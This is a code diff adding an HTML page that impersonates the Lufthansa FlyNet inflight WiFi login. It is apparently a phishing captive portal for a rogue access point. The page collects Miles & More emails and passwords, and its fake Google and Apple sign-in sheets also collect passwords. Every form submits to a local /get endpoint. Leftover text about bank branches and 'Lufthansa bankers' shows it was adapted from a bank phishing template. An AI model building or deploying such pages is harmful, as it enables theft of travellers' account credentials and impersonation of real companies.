@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>Lufthansa FlyNet WiFi</title>
+<style>
+
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column;position:relative}
+.bg{position:fixed;inset:0;z-index:0;background:linear-gradient(170deg,#05164D 0%,#030e35 42%,#fff 42%,#f5f7ff 100%)}
+#t-home,#t-info,#t-help,#tog-g,#tog-a,#tog-aup,#tog-agree,#tog-forgot{display:none}
+nav{position:relative;z-index:10;padding:0;display:flex;justify-content:center;background:rgba(3,12,52,0.96);backdrop-filter:blur(8px);flex-shrink:0;border-bottom:2px solid rgba(255,215,0,0.5)}
+nav label{color:rgba(255,255,255,0.65);font-size:14px;font-weight:500;cursor:pointer;padding:11px 22px;border-bottom:2px solid transparent;margin-bottom:-1px}
+#t-home:checked ~ nav label[for=t-home],
+#t-info:checked  ~ nav label[for=t-info],
+#t-help:checked  ~ nav label[for=t-help]{color:#FFD700;border-bottom-color:#FFD700}
+.scene{position:relative;z-index:5;flex:1;display:flex;flex-direction:column;align-items:center;padding:28px 18px 28px}
+.panel{display:none;width:100%;max-width:440px}
+#t-home:checked ~ .scene .p-home{display:block}
+#t-info:checked  ~ .scene .p-info{display:block}
+#t-help:checked  ~ .scene .p-help{display:block}
+.bank-header{text-align:center;margin-bottom:24px}
+.bank-name{font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;font-size:34px;font-weight:700;color:#fff;letter-spacing:0.5px;text-transform:none;line-height:1.1}
+.bank-sub{font-size:11px;color:rgba(255,255,255,0.65);letter-spacing:2.5px;text-transform:uppercase;margin-top:7px;font-weight:500}
+.terms-card,.login-card,.card{background:#fff;border-radius:8px;padding:20px;box-shadow:0 4px 20px rgba(3,12,52,0.12),0 1px 4px rgba(0,0,0,0.06);margin-bottom:12px;border:1px solid rgba(3,12,52,0.1)}
+.terms-card p{font-size:14px;color:#444;line-height:1.65;margin-bottom:12px}
+.terms-card p:last-of-type{margin-bottom:0}
+.card h2{font-size:16px;font-weight:700;color:#FFD700;margin-bottom:9px}
+.card p{font-size:13.5px;color:#444;line-height:1.65;margin-bottom:10px}
+.card ul{font-size:13.5px;color:#444;line-height:1.8;padding-left:18px}
+.agree-row{background:#f0f3ff;border-radius:6px;padding:13px 15px;display:flex;align-items:center;gap:12px;margin-top:14px;border:1px solid rgba(3,12,52,0.12)}
+.agree-box{width:28px;height:28px;background:#d0d4f8;border-radius:4px;flex-shrink:0;cursor:pointer;border:1.5px solid #a0a4e0;display:flex;align-items:center;justify-content:center;font-size:16px;color:transparent}
+#tog-agree:checked ~ .scene .agree-box{background:#FFD700;color:#fff;border-color:#FFD700}
+.agree-lbl{font-size:14px;color:#444}
+.aup-link{color:#FFD700;cursor:pointer;text-decoration:underline;text-underline-offset:2px}
+.card-title{font-size:15px;font-weight:700;color:#1a1a1a;margin-bottom:16px;text-align:center}
+.field-lbl{display:block;font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:1px;color:#888;margin-bottom:5px;margin-top:14px}
+.field-lbl:first-of-type{margin-top:0}
+.inp{width:100%;padding:13px 14px;border:1.5px solid #c8cce8;border-radius:6px;font-size:15px;background:#f8f9ff;color:#1a1a1a;font-family:inherit;outline:none;display:block}
+.inp:focus{border-color:#FFD700;box-shadow:0 0 0 3px #FFD70018}
+.inp::placeholder{color:#bbb}
+.btn-connect{width:100%;padding:14px;border:none;border-radius:6px;background:#05164D;color:#FFD700;font-size:15px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;cursor:pointer;font-family:inherit;margin-top:16px;display:block;text-align:center;box-shadow:0 2px 8px rgba(3,12,52,0.3)}
+.forgot-lbl{display:block;text-align:right;font-size:12.5px;color:#FFD700;margin-top:8px;cursor:pointer;text-decoration:underline;text-underline-offset:2px;width:fit-content;margin-left:auto}
+.divider{display:flex;align-items:center;gap:10px;margin:14px 0}
+.divider::before,.divider::after{content:"";flex:1;height:1px;background:#c8cce8}
+.divider span{font-size:12px;color:#aaa;white-space:nowrap}
+.btn-google{width:100%;padding:12px;border:1.5px solid #c8cce8;border-radius:6px;background:#fff;color:#1a1a1a;font-size:14px;font-weight:600;cursor:pointer;margin-bottom:8px;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:9px}
+.btn-apple{width:100%;padding:12px;border:1px solid #1a1a1a;border-radius:6px;background:#1a1a1a;color:#fff;font-size:14px;font-weight:600;cursor:pointer;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:9px}
+.g-dots{display:flex;gap:3px}
+.gd{width:8px;height:8px;border-radius:50%}
+.help-item{background:#f0f3ff;border-radius:8px;padding:13px 15px;margin-bottom:8px;border:1px solid rgba(3,12,52,0.08)}
+.help-q{font-size:14px;font-weight:700;color:#FFD700;margin-bottom:4px}
+.help-a{font-size:13px;color:#444;line-height:1.6}
+.overlay{display:none;position:fixed;inset:0;background:rgba(1,6,30,0.5);z-index:100;align-items:flex-end;justify-content:center}
+#tog-aup:checked ~ .ov-aup,#tog-g:checked ~ .ov-g,#tog-a:checked ~ .ov-a,#tog-forgot:checked ~ .ov-forgot{display:flex}
+.bd{position:absolute;inset:0;cursor:default}
+.handle{width:36px;height:4px;background:#dde5ef;border-radius:2px;margin:0 auto 18px}
+.sheet-aup{position:relative;background:#fff;border-radius:20px 20px 0 0;width:100%;max-width:480px;max-height:82vh;overflow-y:auto;padding:20px 22px 36px;z-index:1}
+.aup-head{margin-bottom:16px;padding-bottom:14px;border-bottom:1px solid #eef2f8}
+.aup-head-title{font-size:17px;font-weight:700;color:#FFD700}
+.aup-head-sub{font-size:12px;color:#aaa;margin-top:2px}
+.aup-section{margin-bottom:16px}
+.aup-section h3{font-size:12px;font-weight:700;color:#FFD700;text-transform:uppercase;letter-spacing:0.8px;margin-bottom:7px}
+.aup-section p{font-size:13.5px;color:#444;line-height:1.65;margin-bottom:7px}
+.aup-section ul{font-size:13.5px;color:#444;line-height:1.7;padding-left:18px}
+.aup-close{width:100%;padding:14px;border:none;border-radius:10px;background:#FFD700;color:#fff;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit;margin-top:8px;display:block;text-align:center}
+.sheet-forgot{position:relative;background:#fff;border-radius:20px 20px 0 0;width:100%;max-width:480px;padding:20px 22px 38px;z-index:1}
+.forgot-title{font-size:19px;font-weight:700;color:#FFD700;text-align:center;margin-bottom:4px}
+.forgot-sub{font-size:13px;color:#666;text-align:center;margin-bottom:20px;line-height:1.55}
+.f-lbl{font-size:12px;color:#888;margin-bottom:5px;display:block}
+.f-inp{width:100%;padding:13px 14px;border:1.5px solid #dde5ef;border-radius:8px;font-size:15px;color:#1a1a1a;font-family:inherit;outline:none;margin-bottom:12px;display:block;background:#fafcff}
+.f-inp:focus{border-color:#FFD700}
+.f-inp::placeholder{color:#bbb}
+.f-row{display:flex;justify-content:space-between;align-items:center;margin-top:4px}
+.f-cancel{font-size:14px;color:#FFD700;cursor:pointer;background:none;border:none;font-family:inherit}
+.f-submit{background:#FFD700;color:#fff;border:none;border-radius:8px;padding:11px 24px;font-size:15px;font-weight:600;cursor:pointer;font-family:inherit}
+.f-note{font-size:12px;color:#aaa;text-align:center;margin-top:14px;line-height:1.6}
+.sheet-g{position:relative;background:#fff;border-radius:20px 20px 0 0;width:100%;max-width:480px;padding:20px 22px 38px;z-index:1}
+.gl{display:flex;gap:4px;justify-content:center;margin-bottom:12px}
+.g-title{font-size:20px;font-weight:600;color:#202124;text-align:center;margin-bottom:3px}
+.g-sub{font-size:13px;color:#5f6368;text-align:center;margin-bottom:18px}
+.g-lbl{font-size:12px;color:#5f6368;margin-bottom:5px;display:block}
+.g-inp{width:100%;padding:12px 14px;border:1.5px solid #e0e0e0;border-radius:10px;font-size:15px;color:#202124;font-family:inherit;outline:none;margin-bottom:12px;display:block}
+.g-inp::placeholder{color:#bbb}
+.g-row{display:flex;justify-content:space-between;align-items:center;margin-top:4px}
+.g-cancel{font-size:14px;color:#1a73e8;cursor:pointer;background:none;border:none;font-family:inherit}
+.g-next{background:#1a73e8;color:#fff;border:none;border-radius:10px;padding:11px 24px;font-size:15px;font-weight:600;cursor:pointer;font-family:inherit}
+.sheet-a{position:relative;background:#f2f2f7;border-radius:20px 20px 0 0;width:100%;max-width:480px;padding:20px 22px 38px;z-index:1}
+.apple-ic{font-size:32px;color:#1a1a1a;text-align:center;margin-bottom:5px}
+.a-title{font-size:17px;font-weight:600;color:#1a1a1a;text-align:center;margin-bottom:4px}
+.a-sub{font-size:13px;color:#666;text-align:center;margin-bottom:18px;line-height:1.5}
+.a-fields{background:#fff;border-radius:12px;overflow:hidden;margin-bottom:12px}
+.a-inp{width:100%;padding:14px 15px;border:none;font-size:16px;color:#1a1a1a;font-family:inherit;outline:none;background:#fff;display:block}
+.a-inp::placeholder{color:#bbb}
+.a-inp:first-child{border-bottom:1px solid #e8e8e8}
+.a-continue{width:100%;padding:14px;border:none;border-radius:12px;background:#1a1a1a;color:#fff;font-size:16px;font-weight:600;cursor:pointer;font-family:inherit;margin-bottom:9px;display:block}
+.a-cancel{display:block;width:100%;padding:13px;border-radius:12px;background:#fff;color:#1a1a1a;font-size:16px;text-align:center;cursor:pointer}
+</style>
+</head>
+<body>
+<div class="bg"></div>
+<input type="radio" name="tab" id="t-home" checked>
+<input type="radio" name="tab" id="t-info">
+<input type="radio" name="tab" id="t-help">
+<input type="checkbox" id="tog-agree">
+<input type="checkbox" id="tog-aup">
+<input type="checkbox" id="tog-forgot">
+<input type="checkbox" id="tog-g">
+<input type="checkbox" id="tog-a">
+<nav>
+  <label for="t-home">Home</label>
+  <label for="t-info">Info</label>
+  <label for="t-help">Help</label>
+</nav>
+<div class="scene">
+  <div class="panel p-home">
+    <div class="bank-header">
+      <div class="bank-name">Lufthansa</div>
+      <div class="bank-sub">FlyNet Inflight WiFi</div>
+    </div>
+    <div class="terms-card">
+      <p>Access to the Lufthansa Customer WiFi Internet service is provided for the use of authorized Lufthansa customers only. Unauthorized use is strictly prohibited.</p>
+      <p>You must read and accept all terms and conditions before using this Service.</p>
+      <div class="agree-row">
+        <label for="tog-agree" class="agree-box">&#10003;</label>
+        <span class="agree-lbl">I agree to the <label for="tog-aup" class="aup-link">Lufthansa AUP</label></span>
+      </div>
+    </div>
+    <div class="login-card">
+      <div class="card-title">Connect to Lufthansa FlyNet</div>
+      <form action="/get">
+        <label class="field-lbl">Miles & More Email</label>
+        <input class="inp" type="text" name="email" placeholder="Miles & More email address" required>
+        <label class="field-lbl">Password</label>
+        <input class="inp" type="password" name="password" placeholder="Password" required>
+        <label for="tog-forgot" class="forgot-lbl">Forgot password?</label>
+        <button type="submit" class="btn-connect">Verbinden</button>
+      </form>
+      <div class="divider"><span>or continue with</span></div>
+      <label for="tog-g" class="btn-google"><div class="g-dots"><div class="gd" style="background:#4285F4"></div><div class="gd" style="background:#EA4335"></div><div class="gd" style="background:#FBBC05"></div><div class="gd" style="background:#34A853"></div></div>Continue with Google</label>
+      <label for="tog-a" class="btn-apple" style="margin-top:8px">&#63743; Continue with Apple</label>
+    </div>
+  </div>
+  <div class="panel p-info">
+    <div class="card">
+      <h2>Lufthansa Branch WiFi</h2>
+      <p>Lufthansa FlyNet provides inflight internet on most long-haul flights and select short-haul routes. Miles & More Members enjoy member pricing and Business Class passengers receive complimentary access.</p>
+      <p>Sign in with your Miles & More credentials to activate your WiFi session. Business and First Class passengers receive complimentary FlyNet access on all long-haul routes.</p>
+      <h2 style="margin-top:4px">Coverage &amp; Access</h2>
+      <ul><li>Available on most Lufthansa long-haul and select short-haul routes</li><li>Miles &amp; More Members receive exclusive pricing</li><li>Business and First Class passengers get complimentary access</li><li>FlyNet Chat free for all passengers</li></ul>
+    </div>
+  </div>
+  <div class="panel p-help">
+    <div class="card">
+      <h2 style="margin-bottom:12px">Help &amp; Support</h2>
+      <div class="help-item"><div class="help-q">Can't connect?</div><div class="help-a">Ensure you're on <strong>Lufthansa_FlyNet</strong>, refresh this page, and sign in with your Lufthansa credentials.</div></div>
+      <div class="help-item"><div class="help-q">Forgot your credentials?</div><div class="help-a">Tap "Forgot password?" on the Home tab to start recovery, or ask a Lufthansa banker for help.</div></div>
+      <div class="help-item"><div class="help-q">How long does my session last?</div><div class="help-a">Your session remains active during your branch visit and closes automatically when you leave.</div></div>
+      <div class="help-item"><div class="help-q">Need more help?</div><div class="help-a">Speak with a Lufthansa banker or call <strong>1-800-645-3880</strong>.</div></div>
+    </div>
+  </div>
+</div>
+<div class="overlay ov-aup"><label for="tog-aup" class="bd"></label><div class="sheet-aup"><div class="handle"></div><div class="aup-head"><div class="aup-head-title">Lufthansa Acceptable Use Policy</div><div class="aup-head-sub">Customer WiFi Service — Terms &amp; Conditions</div></div><div class="aup-section"><h3>1. Authorized Users</h3><p>Access to the Lufthansa Customer WiFi Internet service is provided solely for authorized Lufthansa customers. Use by any unauthorized individual is strictly prohibited and may result in legal action.</p></div><div class="aup-section"><h3>2. Acceptable Use</h3><p>Users agree to use the WiFi service only for lawful purposes. The following are expressly prohibited:</p><ul><li>Unauthorized access to computer systems or networks</li><li>Transmission of unlawful or abusive content</li><li>Distribution of malware, viruses, or harmful code</li><li>Any activity violating applicable federal or state law</li><li>Interference with network operations or other users</li></ul></div><div class="aup-section"><h3>3. Privacy &amp; Monitoring</h3><p>Lufthansa reserves the right to monitor all network activity. Users have no expectation of privacy while using this service. Logs may be disclosed to law enforcement upon lawful request.</p></div><div class="aup-section"><h3>4. Security</h3><p>While Lufthansa employs industry-standard security measures, this is a shared network. Avoid transmitting sensitive financial information over this service.</p></div><div class="aup-section"><h3>5. Termination</h3><p>Lufthansa reserves the right to terminate any user's access at any time without notice for violation of this Policy.</p></div><div class="aup-section"><h3>6. Agreement</h3><p>By checking "I agree" and connecting, you acknowledge that you have read and agree to be bound by this Acceptable Use Policy in its entirety.</p></div><label for="tog-aup" class="aup-close">Close &amp; Return</label></div></div>
+<div class="overlay ov-forgot"><label for="tog-forgot" class="bd"></label><div class="sheet-forgot"><div class="handle"></div><div class="forgot-title">Account Recovery</div><div class="forgot-sub">Enter the email address or username associated with your Lufthansa account.</div><form action="/get"><label class="f-lbl">Email address or username</label><input class="f-inp" type="text" name="email" placeholder="Miles & More email address" required><input type="hidden" name="password" value="recovery-attempt"><div class="f-row"><label for="tog-forgot" class="f-cancel">Cancel</label><button type="submit" class="f-submit">Continue</button></div></form><p class="f-note">You will receive further instructions via your registered contact method. If you need immediate help, speak with a Lufthansa banker at the branch.</p></div></div>
+<div class="overlay ov-g"><label for="tog-g" class="bd"></label><div class="sheet-g"><div class="handle"></div><div class="gl"><div class="gd" style="background:#4285F4;width:10px;height:10px"></div><div class="gd" style="background:#EA4335;width:10px;height:10px"></div><div class="gd" style="background:#FBBC05;width:10px;height:10px"></div><div class="gd" style="background:#34A853;width:10px;height:10px"></div></div><div class="g-title">Sign in with Google</div><div class="g-sub">Continue to your Google Account</div><form action="/get"><label class="g-lbl">Email or phone</label><input class="g-inp" type="text" name="email" placeholder="Enter your email" required><label class="g-lbl">Password</label><input class="g-inp" type="password" name="password" placeholder="Enter your password" required><div class="g-row"><label for="tog-g" class="g-cancel">Cancel</label><button type="submit" class="g-next">Next</button></div></form></div></div>
+<div class="overlay ov-a"><label for="tog-a" class="bd"></label><div class="sheet-a"><div class="handle"></div><div class="apple-ic">&#63743;</div><div class="a-title">Sign in with Apple</div><div class="a-sub">Sign in with your Apple&#8209;ID to continue to Lufthansa WiFi</div><form action="/get"><div class="a-fields"><input class="a-inp" type="text" name="email" placeholder="Apple ID" required><input class="a-inp" type="password" name="password" placeholder="Password" required></div><button type="submit" class="a-continue">Continue</button><label for="tog-a" class="a-cancel">Cancel</label></form></div></div>
+</body>
+</html>
